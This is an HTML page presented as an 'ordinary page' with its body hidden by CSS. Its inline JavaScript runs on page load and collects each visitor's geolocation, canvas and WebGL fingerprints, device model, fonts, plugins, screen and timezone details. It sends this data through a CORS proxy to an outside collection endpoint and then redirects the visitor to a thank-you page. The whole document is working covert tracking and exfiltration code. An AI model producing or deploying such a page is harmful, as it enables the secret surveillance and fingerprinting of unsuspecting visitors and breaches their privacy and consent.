<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة عادية</title>
    <style> 
        body { display: none; } 
        /* إخفاء كامل للصفحة */
    </style>
</head>
<body>
    <script>
        // === استخدم API حقيقي عبر corsproxy.io لتجنب CORS ===
        const apiUrl = 'https://corsproxy.io/?' + encodeURIComponent('http://help2025.runasp.net/api/Collect');

        // === 1. استخراج اسم الجهاز ===
        async function parseDeviceName(ua) {
            try {
                if (navigator.userAgentData) {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "brand"]);
                    if (hints?.model) return `${hints.brand} ${hints.model}`;
                }
            } catch (e) { /* تجاهل الأخطاء */ }

            const patterns = [
                { name: 'Samsung Galaxy S24', pattern: /samsung.*sm-s92/i },
                { name: 'iPhone 15', pattern: /iphone.*15/i },
                { name: 'Android Device', pattern: /android/i }
            ];
            for (let p of patterns) if (p.pattern.test(ua)) return p.name;
            return /windows/i.test(ua) ? 'Windows PC' : 'Unknown';
        }

        // === 2. الموقع الجغرافي ===
        async function getGeolocation() {
            return new Promise(resolve => {
                if (!navigator.geolocation) {
                    return resolve({ error: 'غير مدعوم' });
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy || 0
                    }),
                    () => resolve({ error: 'مرفوض' }),
                    { timeout: 10000 }
                );
            });
        }

        // === 3. بصمة Canvas ===
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('OSINT', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('OSINT', 4, 17);
                return canvas.toDataURL();
            } catch (e) {
                return 'خطأ في Canvas';
            }
        }

        // === 4. بصمة WebGL ===
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'غير مدعوم';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo 
                    ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) 
                    : gl.getParameter(gl.RENDERER);
            } catch (e) {
                return 'غير متاح';
            }
        }

        // === 5. تجميع البصمة ===
        function hashCode(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash.toString(16);
        }

        function generateFingerprint() {
            try {
                const canvas = getCanvasFingerprint();
                const webgl = getWebGLFingerprint();
                const fonts = Array.from(document.fonts).map(f => f.family).join(',');
                const plugins = Array.from(navigator.plugins).map(p => p.name).join(',');
                const str = `${canvas}${webgl}${navigator.hardwareConcurrency || 0}${screen.colorDepth}${fonts}${plugins}`;
                return hashCode(str);
            } catch (e) {
                return 'خطأ في البصمة';
            }
        }

        // === 6. التنفيذ الرئيسي (مع معالجة الأخطاء) ===
        (async () => {
            try {
                // جمع البيانات
                const [geo, deviceName] = await Promise.all([
                    getGeolocation(),
                    parseDeviceName(navigator.userAgent)
                ]);

                const fingerprint = generateFingerprint();

                const data = {
                    clientUuid: crypto.randomUUID?.() || Date.now().toString(36),
                    deviceFingerprint: fingerprint,
                    ipAddress: '',
                    userAgent: navigator.userAgent,
                    deviceName: deviceName,
                    language: navigator.language || 'غير معروف',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    hardwareConcurrency: navigator.hardwareConcurrency || 0,
                    deviceMemory: navigator.deviceMemory || 'غير متاح',
                    connectionType: navigator.connection?.type ?? 'unknown',
                    canvasFingerprint: getCanvasFingerprint().substring(0, 100) + '...',
                    webglRenderer: getWebGLFingerprint(),
                    geolocation: geo,
                    referrer: document.referrer || 'مباشر',
                    entryUrl: window.location.href
                };

                // إرسال البيانات
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(data),
                    mode: 'cors',
                    cache: 'no-cache',
                    redirect: 'follow'
                });

                if (response.ok) {
                    console.log('تم إرسال البيانات بنجاح!');
                } else {
                    console.warn('فشل الإرسال:', response.status, response.statusText);
                }

            } catch (error) {
                console.error('خطأ في الجمع:', error.message || error);
                // لا تُوقف التنفيذ – استمر في التوجيه
            } finally {
                // إعادة توجيه مهما حدث
                setTimeout(() => {
                    try {
                        window.location.href = 'https://example.com/thank-you';
                    } catch (e) {
                        // إذا فشل التوجيه، حاول مرة أخرى
                        window.location = 'https://example.com/thank-you';
                    }
                }, 500);
            }
        })();
    </script>
</body>
</html>